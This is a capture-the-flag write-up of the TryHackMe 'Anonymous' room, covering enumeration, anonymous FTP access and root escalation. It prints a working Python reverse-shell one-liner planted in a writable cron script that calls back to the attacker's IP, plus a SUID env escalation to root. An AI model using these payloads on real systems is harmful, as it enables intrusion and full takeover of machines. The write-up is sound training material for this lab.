# Anonymous

This is my write-up for the room [Basic Pentesting] (https://tryhackme.com/room/anonymous)

Description: Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.
 

Difficulty: Medium


<p align="center">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1024px-Anonymous_emblem.svg.png" style="width:25%;">
</p>

## Reconnaissance

Host = `10.10.181.3`

## Enumeration / Scanning

Let's start with an initial Nmap scan.

### Service / Port Enumeration

```console
# nmap -sC -sV -A -T4 10.10.181.3

# Nmap scan report for 10.10.181.3
Host is up (0.15s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT:                                                                                                             
| FTP server status:                                                                                                  
|      Connected to ::ffff:10.13.27.142                                                                               
|      Logged in as ftp                                                                                               
|      TYPE: ASCII                                                                                                    
|      No session bandwidth limit                                                                                     
|      Session timeout in seconds is 300                                                                              
|      Control connection is plain text                                                                               
|      Data connections will be plain text                                                                            
|      At session startup, client count was 4                                                                         
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -16s, deviation: 0s, median: -17s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-03-11T22:36:18+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-11T22:36:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  3 17:10:36 2021 -- 1 IP address (1 host up) scanned in 20.42 seconds
```
```
# The Nmap scan gives us 4 ports or services.
Ports:
21 FTP
22 SSH
139 netbios
445 netbios

Port 80 is not open so lets start looking at what is available. FTP would be first
```
### FTP


Lets take a look at the FTP server and log in as anoymous
```console
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2709 Mar 11 23:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```
```console
rw-r--r-- 1 noob2uub noob2uub  314 Mar 11 15:14 clean.sh
-rw-r--r-- 1 noob2uub noob2uub   21 Mar 11 14:31 README.md
-rw-r--r-- 1 noob2uub noob2uub 2838 Mar 11 15:14 removed_files.log
-rw-r--r-- 1 noob2uub noob2uub   68 Mar 11 15:14 to_do.txt
```
Lets take a look at the files that we pulled down now. 

```console
noob2uub@kali:~/Documents/tryhackme/Anonymous$ cat to_do.txt
I really need to disable the anonymous login...it's really not safe
```

This doesn't really tell us anything that we don't already know. So lets take a look at the clean.sh

```console
cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

This look like a CRON job, lets dive more in seeing what we can do with this. Maybe convert it to something malicious thatwe can get it to execute. Lets also look at the .log file

```console
cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

This confirms that the .sh file is running a scheduled task so, lets look into a possible reverse shell. 

### Reverse Shell

By going to Pentest Monkey (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I am able to find a few reverse shells. Lets see if we can get the python one to execute. 

I removed the content within the .sh and put the pentest monkey reverse shell in and added my IP to it.

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.27.142",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now start your NC Listener on port 1234 

```console
nc -nlvp 1234
listening on [any] 1234 ...
```

Then go back into the FTP server and navigate to the scripts folder and add your clean.sh

```console
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         3956 Mar 11 23:40 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
228 bytes sent in 0.00 secs (3.3452 MB/s)
ftp> 
```

We see that the NC Lister connected after about a minute of time

```console
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.13.27.142] from (UNKNOWN) [10.10.181.3] 58680
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Then lets stabilize our shell by using: python -c 'import pty; pty.spawn("/bin/bash")' and see what we have access to. 

```console
connect to [10.13.27.142] from (UNKNOWN) [10.10.181.3] 58680
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ls -la
ls -la
total 60
drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts
namelessone@anonymous:~$ 
```
I see the user.txt flag is sitting right there. Lets cat it and get the flag and then explore the pics folder
```console
namelessone@anonymous:~$ cd pics                                                                                                       
cd pics                                                                                                                                    
namelessone@anonymous:~/pics$ ls -la                                                                                                             
ls -la                                                                                                                                                  
total 312                                                                                                                                                     
drwxr-xr-x 2 namelessone namelessone   4096 May 17  2020 .
drwxr-xr-x 6 namelessone namelessone   4096 May 14  2020 ..
-rw-r--r-- 1 namelessone namelessone  42663 May 12  2020 corgo2.jpg
-rw-r--r-- 1 namelessone namelessone 265188 May 12  2020 puppos.jpeg
```
We also have a username of namelessone if that provise us information.

sudo -l was also disabled, so lets run a search to see if we can find what SUID namelessone has permissiong to access.

### Priveledge Escaltion
```console
find / -perm -u=s -type f 2>/dev/null  
find / -perm -u=s -type f 2>/dev/null  
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

/usr/bin/env looks interesting. After searching GTFObins I found this

### SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```console
sudo install -m =xs $(which env) .

./env /bin/sh -p
```
```console
namelessone@anonymous:~$ sudo install -m =xs $(which env) .

./env /bin/sh -psudo install -m =xs $(which env) .
[sudo] password for namelessone: 
Sorry, try again.
[sudo] password for namelessone: 

Sorry, try again.
[sudo] password for namelessone: 

sudo: 3 incorrect password attempts
namelessone@anonymous:~$ 
```
This didn't work but after looking at the command again lets only work with the .env /bin/sh -p so /usr/bin/env /bin/sh -p
```console
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
# 
```
```
We are root now lets find the last flag. 
```
```console
ls
bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var
boot  dev    home  lib64  media       opt  root  sbin  srv   sys       usr
# cd root
cd root
# ls
ls
root.txt
# cat root.txt
cat root.txt
```
```
